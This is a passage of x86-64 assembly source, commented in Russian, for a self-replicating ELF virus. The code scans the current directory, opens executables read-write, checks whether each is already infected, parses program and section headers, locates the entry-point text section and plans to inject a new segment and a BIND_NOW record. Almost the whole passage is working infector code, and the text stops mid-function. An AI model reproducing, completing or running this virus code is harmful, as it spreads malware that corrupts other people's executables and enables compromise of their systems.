    .text 0

    .global	_start
	.type	_start, @function

_start:
    leaq    _start_infector(%rip), %rsi
    jmp     *%rsi

/// Если эта переменная существует,
/// макросы будут генерировать отладочный вывод
    .set DEBUG_MODE, 1

#define CANARY_VAL 0xDEADBEEFBAADF00D

    // Макрос для генерации сообщений об ошибках

    .macro ERR_MSG name msg
        .ifdef DEBUG_MODE
            \name\()_error:
                lea     \name\()_msg_e(%rip), %rsi
                mov     $len_e_\name, %rdx
                  jmp     _error_msg
            \name\()_msg_e:
                .ascii "ERR: \msg\()\n"
                .set len_e_\name, . - \name\()_msg_e
        .else
            \name\()_error:
                jmp     \name\()_exit
        .endif
    .endm


    // Марос для проверки, не переполнен ли стек
    .macro CHECK_CANARY
        .ifdef DEBUG_MODE
            mov     _canary(%rip), %rax
            mov    $CANARY_VAL, %rbx
            cmp    %rax, %rbx
            je      1f              # forward label 1
            lea     2f(%rip), %rsi  # forward label 2
            mov     $len_e_canary_\@, %rdx
            jmp     _error_msg
        2:
            .string "ERR: canary \@\n"
            .set len_e_canary_\@, . - 2b
        1:
        .endif
    .endm


/// печать сообщения об ошибке и выход
/// из программы
_error_msg:
    .ifdef DEBUG_MODE
    call    _my_write
    .endif
    jmp    _restore_registers_and_stack

/// CONST--------------------------------------

    .set O_RDONLY, 0x0
    .set O_RDWR, 0x2
    .set MAP_PRIVATE, 0x2
    .set PROT_NONE, 0x0
    .set PROT_READ, 0x1
    .set PROT_WRITE, 0x2
    .set PROT_EXEC, 0x4
    .set PROT_READ_OR_PROT_WRITE, 0x3
    .set O_RDWR_AND_O_APPEND, 0x402
    .set ELF_E_ENTRY, 0x18
    .set ELF_E_PHOFF, 0x20
    .set ELF_E_SHOFF, 0x28
    .set ELF_E_PHNUM, 0x38
    .set ELF_E_SHNUM, 0x3c
    .set PHDR_P_OFFSET, 0x8
    .set PHDR_P_VADDR, 0x10
    .set PHDR_P_PADDR, 0x18
    .set PHDR_P_FILESZ, 0x20
    .set PHDR_P_MEMSZ, 0x28
    .set PHDR_P_ALLIGN, 0x30
    .set SHDR_SH_ADDR, 0x10
    .set SHDR_SH_TYPE, 0x4
    .set SHDR_SH_OFFSET, 0x18
    .set SHDR_SH_SIZE, 0x20

_msg_infection_success:
    .ascii " is successfully infected \n"
    .set len_msg_infection_success, . - _msg_infection_success

_msg_cur_infection:
    .ascii " file: infection try \n"

mprotect_ok:
    .quad -1

old_rsp:
    .quad 0     # вершина стека жертвы

old_rbx:
    .quad 0

old_rdx:
    .quad 0

old_rcx:
    .quad 0

old_rdi:
    .quad 0

old_rsi:
    .quad 0

old_r8:
    .quad 0

old_r9:
    .quad 0

old_r10:
    .quad 0

old_r11:
    .quad 0

old_r12:
    .quad 0

old_r13:
    .quad 0

old_r14:
    .quad 0

old_r15:
    .quad 0

_stack_top:
    .space 6000, 0

_stack_bottom:
    .quad 0

fd:
    .quad 0

cur_filename:
    .quad 0

dir_name:
    .string "./"

dir_buf:
    .space 8000, 0

dir_struct:
    .space 30, 0

dir_buf_ptr:
    .quad 0

file_name_ptr:
    .quad 0

string_length:
    .quad 0

victim_elf_addr:
	.quad 0

victim_phdr_table_addr:
	.quad 0

victim_phdr_table_size:
	.quad 0

victim_phdr_amount:
	.quad 0

victim_shdr_table_addr:
	.quad 0

victim_shdr_table_size:
	.quad 0

victim_shdr_amount:
    .quad 0

virus_new_vaddr:
    .quad 0

virus_new_phdr:
    .space 0x38, 0

virus_new_shdr:
    .space 0x40, 0

last_seg_vaddr:
    .quad 0

last_seg_allign:
    .quad 0

victim_code_size:
    .quad 0

victim_code_addr:
    .quad 0

victim_code_frm_begin_vaddr:
    .quad 0

victim_code_offset:
    .quad 0

victim_code_before_bind_now_size:
	.quad 0

victim_code_after_bind_now_size:
	.quad 0

victim_code_before_bind_now_addr:
	.quad 0

victim_code_after_bind_now_addr:
	.quad 0

virus_code_addr:
	.quad 0

virus_code_size:
	.quad 0

symtab_shdr_addr:
	.quad 0

symtab_records_amount:
	.quad 0

dynamic_records_offset:
	.quad 0

dynamic_records_size:
	.quad 0

dynamic_records_vaddr:
    .quad 0

new_bind_now_flag_record_size:
    .quad 0

new_bind_now_record_frm_dynamic_offset:
	.quad 0

original_e_entry:
	.quad 0

offset_to_e_entry:
	.quad 0

move_victim_offset:
    .quad 0

offset_to_e_entry_frm_file_begin:
	.quad 0

frm_orig_e_entry_to_virus_e_entry_offset:
    .quad 0

offset_to_vict_code_frm_file_begin:
    .quad 0

sh_name_indx:
    .long 0

first_seg_vaddr:
	.quad 0

first_seg_addr:
	.quad 0

GOT_vaddr:
	.quad 0

rela_section_offset:
    .quad 0

rela_section_size:
    .quad 0

/// Разрешает коду вируса писать
/// в самого себя
_allow_write_into_code:
    push    %rdx
    push    %rcx
    push    %rdi
    push    %rsi

    lea     _start(%rip), %rdi
    and     $~0xFFF, %rdi       # ..in %RDI
    lea     _fin_infector(%rip), %rsi   # get end addr

    sub     %rdi, %rsi          # total size - %RSI
    mov     $0x7, %rdx          # RW+EXEC flags - $RDX
    mov     $0xA, %rax          # mprotect handle
    syscall

    test    %rax, %rax
    jne     _allow_write_into_code_error

    mov     %rax, mprotect_ok(%rip)
_allow_write_into_code_exit:
    pop     %rsi
    pop     %rdi
    pop     %rcx
    pop     %rdx

    ret

    ERR_MSG _allow_write_into_code "mprotect in _start"

/// Сохраняет все регистры кроме rax -
/// он уже изменен - в переменные и
/// настраивает стек
/// Проверяет MPROTECT_OK
_save_registers:
    mov   mprotect_ok(%rip), %rax
    test  %rax, %rax
    jne   _save_registers_fail

    mov     %rsp, old_rsp(%rip)
    lea     _stack_bottom(%rip), %rsp

    mov     %rbx, old_rbx(%rip)
    mov     %rdx, old_rdx(%rip)
    mov     %rcx, old_rcx(%rip)
    mov     %rdi, old_rdi(%rip)
    mov     %r8, old_r8(%rip)
    mov     %r9, old_r9(%rip)
    mov     %r10, old_r10(%rip)
    mov     %r11, old_r11(%rip)
    mov     %r12, old_r12(%rip)
    mov     %r13, old_r13(%rip)
    mov     %r14, old_r14(%rip)
    mov     %r15, old_r15(%rip)

    xor     %rax, %rax
    jmp     _save_registers_exit

_save_registers_fail:
    mov     $-1, %rax

_save_registers_exit:
    jmp     _clear_old_data

/// Очищает данные о секции dynamic,
/// GOT, и записи BIND_NOW
_clear_dynamic_and_bind_now_data:
    movq    $0, dynamic_records_offset(%rip)
    movq    $0, dynamic_records_size(%rip)
    movq    $0, dynamic_records_vaddr(%rip)
    movq    $0, GOT_vaddr(%rip)
    movq    $0, new_bind_now_flag_record_size(%rip)

    ret

/// Открывает директорию
/// и считывает все ее записи в буфер
_my_readdir:
    push    %rdi
    push    %rsi
    push    %rbx

    // открыть директорию
    lea     dir_name(%rip), %rdi
    mov     $0x0, %rsi
    mov     $0x2, %rax  # fopen syscall
    syscall

    test     %rax, %rax
    jl      _my_readdir_open_error

    // заполянем структуру потока
    lea     dir_struct(%rip), %rbx
    mov     %eax, (%rbx)
    movq    $0x8000, 0x8(%rbx) # размер буфера


    // параметры getdents
    mov     (%rbx), %rdi
    lea     dir_buf(%rip), %rsi
    mov     8(%rbx), %rdx

    // вызов getdents
    mov    $0x4e, %rax
    syscall

    // в случае успеха возвращ.
    // кол-во считанных байт
    // иначе 0
    cmp     $0x0, %rax
    jle     _my_readdir_read_error

    // сохранили указатель на первую структуру
    // в буфере
    lea     dir_buf_ptr(%rip), %rbx
    mov     %rsi, (%rbx)

    xor     %rax, %rax
    pop     %rbx
    pop     %rsi
    pop     %rdi

    ret

    ERR_MSG _my_readdir_open "_my_readdir: Can't open directory"
    ERR_MSG _my_readdir_read "_my_readdir: Can't read directory"


/// Проверяет: указатель на текущую запись
/// Успех: заполняет cur_filename указателем на
/// имя и возвращает 0 в rax
/// Фейл: заполняет cur_filename нулем и
/// возвращает -1 в rax
_get_file_name:
    push    %rbx
    push    %rcx

    // указатель не нулевой?
    mov     dir_buf_ptr(%rip), %rbx
    test    %rbx, %rbx
    je      _get_file_name_fail

    // получили имя
    lea     0x12(%rbx), %rax
    mov     %rax, file_name_ptr(%rip)

    xor     %rcx, %rcx
    // получили размер текущей структуры
    // (он меняется)
    movzwl  0x10(%rbx), %ecx
    // сдвинули указатель на
    // следующую структуру
    add     %rcx, %rbx

    mov     %rbx, dir_buf_ptr(%rip)
    xor     %rax, %rax

    jmp    _get_file_name_exit
_get_file_name_fail:
    mov     $-1, %rax
    movq    $0x0, file_name_ptr(%rip)

_get_file_name_exit:
    pop     %rcx
    pop     %rbx

    ret


/// _MY_STRLEN
/// PARAMS -
/// RDI - указатель на строку
/// Изменяет STRING_LENGTH
_my_strlen:
    xor     %rax, %rax

    push    %rcx
    push    %rbx

    test    %rdi, %rdi
    je      _my_strlen_fail
    // je      _my_strlen_error

    mov     $0x64, %rcx
    repne   scasb

    mov     $0x64, %rbx
    sub     %rcx, %rbx
    mov     %rbx, %rax
    dec     %rax

    mov     %rax, string_length(%rip)
    xor     %rax, %rax

    jmp    _my_strlen_exit

_my_strlen_fail:
    mov     $-1, %rax

_my_strlen_exit:
    pop     %rbx
    pop     %rcx

    ret

    ERR_MSG _my_strlen "_my_strlen: NULL pointer"

/// WRITE TO STDOUT
/// @PARAMS
///   - %RSI - msg pointer
///   - %RDX - msg size
_my_write:
    mov      $0x1, %rax          # write
    mov      %rax, %rdi          # to stdout
    syscall
    ret

/// Печатает имя файла,
/// который пытается заразить вирус в
/// данный момент
_print_infection_log:
    push     %rsi
    push     %rdi
    push     %rdx

    mov      file_name_ptr(%rip), %rsi
    test     %rsi, %rsi
    je       _print_infection_log_fail

    mov      file_name_ptr(%rip), %rdi
    call     _my_strlen

    mov      string_length(%rip), %rdx
    test     %rdx, %rdx
    je       _print_infection_log_fail

    call    _my_write

    lea     _msg_cur_infection(%rip), %rsi
    mov     $0x16, %rdx
    call    _my_write

_print_infection_log_fail:
    mov     $-1, %rax

_print_infection_log_exit:
    pop     %rdx
    pop     %rdi
    pop     %rsi

    ret

/// OPENFILE
/// Открывает файл с указанными флагами,
/// маппит его в память
///
/// @PARAMS:
/// - %RDI - file name
/// - %RSI - flags
///
/// @RET:
/// - %RAX - указатель на файл в памяти
/// или отричательное значение
_openfile:
    push    %rbp
    mov     %rsp, %rbp

    mov     $0x2, %rax  # fopen syscall
    syscall
    test    %rax, %rax

    jl      _openfile_exit

    // save all regs
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %r9
    push    %r10

    # сохранить дескриптор жертвы
    mov     %rax, fd(%rip)

    // space for local vars
    sub     $0xA0, %rsp

    mov     %rax, %rcx          # fd
    mov     %rsi, %rdx          # openfile flags

    // call stat
    // (need no less 0xA0 for struct stat)
    // leaq    -0xA0(%rbp), %rsi   #  stat struct ptr
    leaq    -0xD0(%rbp), %rsi   #  stat struct ptr
    call    _my_stat

    // prepare params for mmap
    mov     %rcx, %r8           # fd
    mov     %rdx, %rax          # flags
    xor     %rdi, %rdi          # addr

    // 0x70 - offset to filesz field in stat struct
    // mov     -0x70(%rbp), %rsi   # filesz
    mov     -0xA0(%rbp), %rsi   # filesz
    xor     %r9, %r9            # offset

    // doesn't need shared mmap
    mov     $MAP_PRIVATE, %rcx

    mov     $O_RDONLY, %rbx
    cmp     %rbx, %rax
    je      mmap_rdonly

    // define mmap flags
    mov     $O_RDWR, %rbx
    cmp     %rbx, %rax
    jne     _openfile_flags_error

mmap_rdwr:
    mov     $(PROT_READ | PROT_WRITE), %rdx # prot
    jmp     call_my_mmap

mmap_rdonly:
    mov     $PROT_READ, %rdx            # prot
    // call mmap
call_my_mmap:
    call    _my_mmap

    // recover stack
    add     $0xA0, %rsp
    pop     %r10
    pop     %r9
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx

_openfile_exit:
    pop     %rbp
	ret

    ERR_MSG _openfile_neg_fd "openfile neg fd"
    ERR_MSG _openfile_flags "openfile undefined flags"
    ERR_MSG _openfile_ptr "openfile returned zero ptr"


/// MY_MMAP file into memory
/// Считывает файл в память по заданному адресу.
/// Флаги должны быть такими же, какие передавали
/// open для открытия файла.
/// @PARAMS
///  - %RDI - адрес для записи (по умолчанию NULL,
///           в этом случае назначается OS)
///  - %RSI - длина считываемого файла
///  - %RDX - права доступа к памяти
///           (RDONLY, RDWR и т.д.)
///  - %RCX -  права для доступа к памяти для
///            процессов (MMAP_SHARED, MMAP_PRIVATE)
///  * %R8 -   fd считываемого файла
///  * %R9 -   offset от начала считываемого файла
/// @ RETURN VALUE
/// * RAX - указатель на файл в памяти или отриц. заначени
_my_mmap:
    push %rbx
	push %rcx
	push %rdx
	push %rbp
	push %r10

	mov %r9, %r15
	mov %rsi, %r13
	mov %rdi, %r12
	mov %ecx, %r14d

	movslq %r8d, %rbp
	movslq %edx, %rbx
	movslq %r14d, %r10
	mov $0x9, %eax

	syscall

	pop %r10
	pop %rbp
	pop %rdx
	pop %rcx
	pop %rbx

	ret

/// MY_STAT
/// @PARAMS
/// %RDI - file name
/// %RSI - stat struct pointer
_my_stat:
    push    %rcx
    mov     $0x04, %rax

    syscall

    test    %rax, %rax
    jnz     _my_stat_error
_my_stat_exit:
    pop     %rcx
  	ret

    ERR_MSG _my_stat "my_stat"

/// IS_IT_ELF
/// PARAMS
/// Проверяет наличие магических байт в
/// загруженном эльфе
/// Если магические байты есть, то
/// возвращает 1 в RAX
/// В противном случае - 0
magic_bytes_example:
    .quad 0x10102464c457f

_is_it_elf:
    push    %rdx
    push    %rbx
    push    %rsi
    push    %rcx

    mov     victim_elf_addr(%rip), %rbx
    test    %rbx, %rbx
    je      _is_it_elf_fail

    movq    (%rbx), %rdx
    mov     magic_bytes_example(%rip), %rsi

    cmp     %rsi, %rdx
    jne     _is_it_elf_fail

    xor     %rax, %rax
    jmp     _is_it_elf_exit

_is_it_elf_fail:
    mov     $-1, %rax

_is_it_elf_exit:
    pop     %rcx
    pop     %rsi
    pop     %rbx
    pop     %rdx

    ret

/// Открывает файл и сохраняет его
/// адрес
_get_victim_addr:
    push    %rdi
    push    %rsi

    mov     file_name_ptr(%rip), %rdi
    mov     $O_RDWR, %rsi
    call    _openfile

    cmp     $0x0,  %rax
    jl      _get_victim_addr_exit

    mov     %rax, victim_elf_addr(%rip)
    xor     %rax, %rax

_get_victim_addr_exit:
    pop    %rsi
    pop    %rdi

    ret
/// получает данные о заголовках сегментов
/// жертвы:
/// - адрес заголовков в памяти
/// - количество
/// - суммарно занимаемая память
/// в случае провала возвращ. -1
_get_phdrs_info:
    push    %rdi
    push    %rsi
    push    %rcx
    push    %rdx

    mov     victim_elf_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _get_phdrs_info_fail

    mov     %rdi, %rsi
    mov     ELF_E_PHOFF(%rdi), %rcx
    add     %rcx, %rsi
    mov     %rsi, victim_phdr_table_addr(%rip)

    mov     ELF_E_PHNUM(%rdi), %ecx
    movzwl  %cx, %ecx
    mov     %rcx, victim_phdr_amount(%rip)

    mov     $0x38, %rdx
    imul    %rcx,  %rdx
    mov     %rdx, victim_phdr_table_size(%rip)

    xor     %rax, %rax
    jmp     _get_phdrs_info_exit

_get_phdrs_info_fail:
    mov     $-1, %rax

_get_phdrs_info_exit:
    pop     %rdx
    pop     %rcx
    pop     %rsi
    pop     %rdi
    ret
/// получает данные о заголовках секций
/// жертвы:
/// - адрес заголовков в памяти
/// - количество
/// - суммарно занимаемая память
/// в случае провала возвращ. -1
_get_shdrs_info:
    push    %rdi
    push    %rsi
    push    %rcx
    push    %rdx

    mov     victim_elf_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _get_shdrs_info_fail
    mov     %rdi, %rsi

    mov     ELF_E_SHOFF(%rdi), %rcx
    add     %rcx, %rsi
    mov     %rsi, victim_shdr_table_addr(%rip)

    mov     ELF_E_SHNUM(%rdi), %ecx
    movzwl  %cx, %ecx
    mov     %rcx, victim_shdr_amount(%rip)

    mov     $0x40, %rdx
    imul    %rcx,  %rdx
    mov     %rdx, victim_shdr_table_size(%rip)

    xor     %rax, %rax
    jmp     _get_shdrs_info_exit

_get_shdrs_info_fail:
    mov     $-1, %rax

_get_shdrs_info_exit:
    pop     %rdx
    pop     %rcx
    pop     %rsi
    pop     %rdi
    ret

/// Ищет и заполняет данные о
/// первом сегменте кода эльфа
_find_first_seg_vaddr:
    push    %rcx
    push    %r8

    mov     victim_phdr_table_addr(%rip), %r8
    mov     victim_phdr_amount(%rip), %rcx

    test    %r8, %r8
    je      _find_first_seg_vaddr_fail

    test    %rcx, %rcx
    je      _find_first_seg_vaddr_fail

    mov     %r8, %rdi

_find_first_seg_vaddr_cycle:
    cmp     $0x1, (%rdi)
    jne     _find_first_seg_vaddr_next

    cmp     $0x1, (%r8)
    jne     _set_first_seg

    mov     PHDR_P_VADDR(%rdi), %rsi
    mov     PHDR_P_VADDR(%r8), %rax

    cmp     %rax, %rsi
    jl      _set_first_seg
    jmp     _find_first_seg_vaddr_next

_set_first_seg:
    mov     %rdi, %r8

_find_first_seg_vaddr_next:
    add     $0x38, %rdi
    loop    _find_first_seg_vaddr_cycle

_find_first_seg_vaddr_success:
    leaq    first_seg_vaddr(%rip), %rsi
    mov     PHDR_P_VADDR(%r8), %rdi
    mov     %rdi, (%rsi)

    leaq    first_seg_addr(%rip), %rsi
    mov     %r8, (%rsi)

    xor     %rax, %rax
    jmp    _find_first_seg_vaddr_exit

_find_first_seg_vaddr_fail:
    mov     $-1, %rax

_find_first_seg_vaddr_exit:
    pop     %r8
    pop     %rcx

    ret

/// _CHECK_FILE_INFECTION
/// Проверяет, является ли открытый файл зараженным
/// - проверяем каждый загружаемый сегмент
/// - берем его смещение, считаем адрес его кода
///   в памяти
/// - сравнивам первый 32 байта по этому адресу со
///   start вируса
/// - если совпали - файл заражен, вернуть -1
/// - иначе проверить все сегменты, если нигде не совпало,
/// вернуть 0
_check_file_infection:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %rdi
    push    %rsi

    mov     victim_elf_addr(%rip), %rdx
    mov     victim_shdr_table_addr(%rip), %rsi
    mov     victim_shdr_amount(%rip), %rcx
    leaq    _start(%rip), %rdi

    test     %rdx, %rdx
    je      _infected

    test     %rsi, %rsi
    je      _infected

    test     %rcx, %rcx
    je      _infected

_check_file_infection_cycle:

    push    %rcx
    mov     SHDR_SH_TYPE(%rsi), %rbx

    // секция SHT_PROGBITS?
    cmp     $0x1, %bl
    jne     _next_segm


    mov     SHDR_SH_OFFSET(%rsi), %rbx
    mov     $0x4, %rcx

    // адрес сегмента в памяти
    add     %rdx, %rbx

_check_segm_infection_cycle:
    movq    (%rdi), %rax
    movq    (%rbx), %r8

    cmp     %rax,  %r8
    jne     _next_segm

    add     $0x8, %rdi
    add     $0x8, %rbx

    loop    _check_segm_infection_cycle
    jmp     _infected

_next_segm:
    pop     %rcx
    add     $0x40, %rsi
    loop    _check_file_infection_cycle

    jmp     _clear

_infected:
    pop     %rcx
    mov     $-1, %rax
    jmp     _check_file_infection_exit

_clear:
    mov     $0x0, %rax

_check_file_infection_exit:
    pop    %rsi
    pop    %rdi
    pop    %r8
    pop    %rdx
    pop    %rcx
    pop    %rbx

    ret

/// _FIND_LAST_SEG_VADDR
/// Ищет виртуальный адрес последнего сегмента кода
_find_last_seg_vaddr:
    push    %rcx
    push    %r8
    push    %rdi
    push    %rsi

    mov     victim_phdr_table_addr(%rip), %r8
    mov     victim_phdr_amount(%rip), %rcx

    test    %r8, %r8
    je      _find_last_seg_vaddr_fail

    test    %rcx, %rcx
    je      _find_last_seg_vaddr_fail

    mov     %r8, %rdi
_find_last_seg_vaddr_cycle:

    cmp     $1, (%rdi)
    jne     _find_last_seg_vaddr_next

    mov     PHDR_P_VADDR(%rdi), %rsi
    mov     PHDR_P_VADDR(%r8), %rax

    cmp     %rax, %rsi
    jg      _set_last_seg
    jmp     _find_last_seg_vaddr_next

_set_last_seg:
    mov     %rdi, %r8

_find_last_seg_vaddr_next:
    add     $0x38, %rdi
    loop    _find_last_seg_vaddr_cycle

_find_last_seg_vaddr_success:
    leaq    last_seg_vaddr(%rip), %rsi

    mov     PHDR_P_VADDR(%r8), %rax
    mov     PHDR_P_ALLIGN(%r8), %rcx

    mov     %rax, (%rsi)
    leaq    last_seg_allign(%rip), %rsi
    mov     %rcx, (%rsi)

    xor     %rax, %rax
    jmp     _find_last_seg_vaddr_exit

_find_last_seg_vaddr_fail:
    mov     $-1, %rax

_find_last_seg_vaddr_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rcx
    ret

/// _FIND_DYNAMIC
/// Ищет заголовок секции dynamic
/// Если находит, то заполняет данные о секции
_find_dynamic:
    push    %rcx
    push    %rdx
    push    %rdi

    mov     victim_shdr_table_addr(%rip), %rdi
    mov     victim_shdr_amount(%rip), %rcx

    test   %rdi, %rdi
    je      _find_dynamic_fail

    test   %rcx, %rcx
    je     _find_dynamic_fail

_find_dynamic_cycle:
    mov     SHDR_SH_TYPE(%rdi), %rdx
    cmp     $0x6, %dl   # shdr = dynamic?
    je      _find_dynamic_success

    add     $0x40, %rdi
    loop    _find_dynamic_cycle
    jmp     _find_dynamic_fail

_find_dynamic_success:
    mov     SHDR_SH_ADDR(%rdi), %rdx
    mov     %rdx, dynamic_records_vaddr(%rip)   # dynamic sh_vaddr

    mov     SHDR_SH_OFFSET(%rdi), %rdx
    mov     %rdx, dynamic_records_offset(%rip)   # dynamic sh_offset

    mov     SHDR_SH_SIZE(%rdi), %rdx
    mov     %rdx, dynamic_records_size(%rip)   # dynamic size

    xor     %rax, %rax
    jmp     _find_dynamic_exit

_find_dynamic_fail:
    mov     $-1, %rax

_find_dynamic_exit:
    pop     %rdi
    pop     %rdx
    pop     %rcx

    ret

/// _FIND_BIND_NOW_RECORD
/// PARAMS
/// Проверяет, есть ли у секции dynamic
/// запись BIND_NOW
/// Если таковой записи нет, то:
/// - высчитываем смещение от начала секции dynamic,
/// по которому будет лежать эта запись (по умолчанию перед
/// записью NULL)
/// - устанавливаем размер будущей новой записи (это нужно, чтоб
/// корректно пересчитывать смещения всех заголовков в будущем)
_find_bind_now_record:
    push    %rdx
    push    %rcx
    push    %r8
    push    %rdi
    push    %rsi

    mov    dynamic_records_offset(%rip), %rdx
    test   %rdx, %rdx
    je      _find_bind_now_record_fail

    mov     dynamic_records_size(%rip),%rax
    test    %rax, %rax
    je      _find_bind_now_record_fail

    // адрес секции dynamic в памяти
    mov    victim_elf_addr(%rip), %rdi
    add    %rdx, %rdi

    mov     %rdi, %r8

    // установили счетчик цикла
    xor     %rdx, %rdx
    mov     $0x10, %ecx
    idiv    %ecx
    mov     %eax, %ecx

_find_bind_now_record_cycle:
    // запсиь BIND_NOW?
    cmpq    $0x18, (%rdi)
    je      _bind_now_record_exist

    // запись NULL?
    cmp     $0x0, (%rdi)
    // запись NULL всегда последняя,
    // так что дальше проверять не имеет смысла
    je      _no_bind_now_record_exist

    add     $0x10, %rdi
    loop    _find_bind_now_record_cycle

    jmp     _no_bind_now_record_exist

_bind_now_record_exist:
    //  обнуили размер новой записи - ее же не будет
    movb    $0x0, new_bind_now_flag_record_size(%rip)
    xor     %rax, %rax

    jmp     _find_bind_now_record_exit

    // записи BIND_NOW нет - придется позже генерировать новую
_no_bind_now_record_exist:
    movb    $0x10, new_bind_now_flag_record_size(%rip)

    // посчитали смещение от начала секции dynamic
    // до места, куда будем вписывать новую запись
    sub     %r8, %rdi
    mov     %rdi, new_bind_now_record_frm_dynamic_offset(%rip)

    xor     %rax, %rax
    jmp     _find_bind_now_record_exit

_find_bind_now_record_fail:
    mov     $-1, %rax

_find_bind_now_record_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rcx
    pop     %rdx

    ret

/// _GET_VICTIM_WHOLE_CODE_ADDR_AND_SIZE
/// Высчитывает адрес и размер всего кода жертвы,
/// если мы не генерируем запись BIND_NOW
_get_victim_whole_code_addr_and_size:
    push    %rcx
    push    %rdx

    // проверяем наличие всех необходимых данных
    // мы генерируем новыую запись BIND_NOW?
    // если да, то этот метод вычисления размера и адреса
    // кода жертвы нам не подходит
    mov     new_bind_now_flag_record_size(%rip), %rcx
    test    %rcx, %rcx
    jne     _get_victim_whole_code_addr_and_size_fail

    mov     victim_phdr_table_size(%rip), %rcx
    test    %rcx, %rcx
    je      _get_victim_whole_code_addr_and_size_fail

    mov     victim_phdr_table_addr(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_whole_code_addr_and_size_fail

    mov     victim_shdr_table_addr(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_whole_code_addr_and_size_fail

    // вычисляем размер и адрес кода жертвы
    leaq    victim_code_offset(%rip), %rdx
    mov     %rcx, (%rdx)
    add     $0x40, (%rdx)

    // считаем адрес кода жертвы
    mov     victim_phdr_table_addr(%rip), %rdx
    add     %rdx, %rcx
    mov     %rcx, victim_code_addr(%rip)

    // считаем  размер кода жертвы
    mov     victim_shdr_table_addr(%rip), %rdx
    sub     %rcx, %rdx
    mov     %rdx, victim_code_size(%rip)

    xor     %rax, %rax
    jmp     _get_victim_whole_code_addr_and_size_exit

_get_victim_whole_code_addr_and_size_fail:
    mov     $-1, %rax

_get_victim_whole_code_addr_and_size_exit:
    pop     %rdx
    pop     %rcx

    ret


/// _GET_VICTIM_CODE_ADDR_AND_SIZE_WITH_BIND_NOW
/// Если мы вставляем запись BIND_NOW,
/// то высчитываем:
/// - адрес и размер кода жертвы от его начала до
///   места вставки BIND_NOW
/// - адрес и размер кода жертвы от места вставки BIND_NOW
///   и до его конца
_get_victim_code_addr_and_size_with_bind_now:
    push    %rcx
    push    %rdx
    push    %rdi
    push    %rsi

    // вставляем BIND_NOW?
    mov     new_bind_now_flag_record_size(%rip), %rcx
    test    %rcx, %rcx
    je     _get_victim_code_addr_and_size_with_bind_now_fail

    // проверка необходимых данных для высчитывания
    mov     victim_phdr_table_size(%rip), %rcx
    test    %rcx, %rcx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    mov     victim_phdr_table_addr(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    mov     victim_shdr_table_addr(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    mov     victim_shdr_table_addr(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    mov      dynamic_records_offset(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    mov     new_bind_now_record_frm_dynamic_offset(%rip), %rdx
    test    %rdx, %rdx
    je      _get_victim_code_addr_and_size_with_bind_now_fail

    // если все данные на месте, начинаем считать
    mov     victim_phdr_table_size(%rip), %rcx
    leaq    victim_code_offset(%rip), %rdx
    mov     %rcx, (%rdx)
    add     $0x40, (%rdx)   # save victim begin code offset

    mov     victim_phdr_table_addr(%rip), %rdx
    add     %rdx, %rcx

    // сохранили адрес начала кода
    mov     %rcx, victim_code_before_bind_now_addr(%rip)

    mov     dynamic_records_offset(%rip), %rdi
    mov     new_bind_now_record_frm_dynamic_offset(%rip), %rsi
    add     %rdi, %rsi  # offsetnew bind_now record frm file begin

    mov     victim_elf_addr(%rip), %rdx
    add     %rsi, %rdx

    // высчитали адрес кода от места вставки
    mov     %rdx,  victim_code_after_bind_now_addr(%rip)
    sub     %rcx, %rdx
    // высчитали размер кода от начала до вставки
    mov     %rdx, victim_code_before_bind_now_size(%rip)

    // высчитали размер кода от вставки до конца
    mov     victim_code_after_bind_now_addr(%rip), %rsi
    mov     victim_shdr_table_addr(%rip), %rdx
    sub     %rsi, %rdx
    mov     %rdx, victim_code_after_bind_now_size(%rip)

    xor     %rax, %rax
    jmp     _get_victim_code_addr_and_size_with_bind_now_exit
_get_victim_code_addr_and_size_with_bind_now_fail:
    xor     $-1, %rax

_get_victim_code_addr_and_size_with_bind_now_exit:
    pop     %rsi
    pop     %rdi
    pop     %rdx
    pop     %rcx

    ret

/// _FIND_VICTIM_TEXT_SECTION
/// находит секцию text для заражения -
/// этот сегмент содержит e_entry
// Как понять, что сегмент содержит e_entry:
// его sh_addr <= e_entry,
// его sh_addr + sh_size > e_entry
/// Этот заголовко секции  нужен, чтоб прочитать его sh_name -
/// индекс в таблице строк, его же присвоим новому заголовку
/// секции вируса

    .globl  _find_victim_text_section
	.type	_find_victim_text_section, @function
_find_victim_text_section:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %rdi
    push    %rsi

    // проверяем наличие необходимых для посика данных
    mov     victim_elf_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _find_victim_text_section_fail

    mov     ELF_E_ENTRY(%rdi), %rdx

    mov     victim_shdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _find_victim_text_section_fail

    mov     victim_shdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je      _find_victim_text_section_fail

_find_victim_text_section_cycle:
    mov     %rdi, %rax
    mov     SHDR_SH_ADDR(%rdi), %rbx     # получаем поле sh_addr

    cmp     %rdx, %rbx  # addr долен быть <= e_entry
    jg      _next_iter_find_text

    mov    %rax, %rdi
    mov    SHDR_SH_SIZE(%rdi), %rsi # размер текущего секц.

    add    %rsi, %rbx   # адрес конца текущeго сегмент

    cmp    %rdx, %rbx   # cur sect. end > e_entry
    jl     _next_iter_find_text

    jmp    _find_text_success   # section is found
_next_iter_find_text:

    add     $0x40, %rax
    mov     %rax, %rdi

    loop    _find_victim_text_section_cycle
    jmp     _find_victim_text_section_fail

_find_text_success:
    leaq    sh_name_indx(%rip), %rcx
    movl    (%rax), %edx
    movl    %edx, (%rcx)  # save sect. sh_name
    xor     %rax, %rax
    jmp     _find_text_exit

_find_victim_text_section_fail:
    mov     $-1, %rax

_find_text_exit:
